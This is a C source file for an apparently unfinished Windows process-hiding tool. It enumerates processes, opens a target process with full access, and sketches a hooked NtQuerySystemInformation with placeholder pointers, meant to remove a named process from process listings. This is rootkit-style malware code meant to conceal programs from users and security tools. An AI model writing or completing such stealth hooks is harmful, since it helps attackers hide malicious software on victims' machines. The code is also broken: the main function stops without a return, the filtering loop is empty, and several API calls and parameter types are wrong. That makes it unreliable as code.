#include "ProcessStealth.h"

DWORD GetProcessIdByImageName(wchar_t* ProcessName)
{
    PSYSTEM_PROCESS_INFORMATION spi;
    DWORD PID = NULL;
    ULONG ReturnLength;

    while (TRUE)
    {
        if (NtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &ReturnLength) != STATUS_INFO_LENGTH_MISMATCH)
        {
            continue;
        }

        spi = VirtualAlloc(NULL, ReturnLength, MEM_COMMIT | MEM_RELEASE, PAGE_READWRITE);

        if (spi == NULL)
        {
            continue;
        }

        if (NT_SUCCESS(NtQuerySystemInformation(SystemProcessInformation, spi, ReturnLength, &ReturnLength)))
        {
            break;
        }

        VirtualFree(spi, 0, MEM_RELEASE);
    }

    PSYSTEM_PROCESS_INFORMATION temp = spi;
    spi = (ULONGLONG)spi + spi->NextEntryOffset;

    while (TRUE)
    {
        if (wcsicmp(spi->ImageName.Buffer, ProcessName) == 0)
        {
            PID = spi->UniqueProcessId;
            break;
        }

        if (spi->NextEntryOffset == 0)
            break;

        spi = (ULONGLONG)spi + spi->NextEntryOffset;
    }
    
    VirtualFree(temp, ReturnLength, MEM_DECOMMIT);
    VirtualFree(temp, 0, MEM_RELEASE);

    return PID;
}

BOOL ProcessStealth(wchar_t TargetProcessName, wchar_t HideProcessName)
{
    DWORD TargetPID = GetProcessIdByImageName(TargetProcessName);

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, TargetPID);

    if (hProcess == NULL)
    {
        printf("[-] OpenProcess Failed!\n");
        printf("[*] GetLastError : %d\n", GetLastError());
        return FALSE;
    }


}

NTSTATUS NTAPI NewNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
{
    volatile BYTE (NTAPI *CloneNtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) = 0xCCCCCCCCCCCCCCCC;
    volatile wchar_t *HideProcessName = 0xCCCCCCCCCCCCCCCC;
    NTSTATUS ntstatus = CloneNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

    if (ntstatus != STATUS_SUCCESS)
    {
        return ntstatus;
    }

    if (SystemInformationClass == 5)
    {
        PSYSTEM_PROCESS_INFORMATION pCur = SystemInformation;
        PSYSTEM_PROCESS_INFORMATION pPrev = NULL;
        pCur = (ULONGLONG)pCur + pCur->NextEntryOffset;

        while (TRUE)
        {
            
        }
    }
}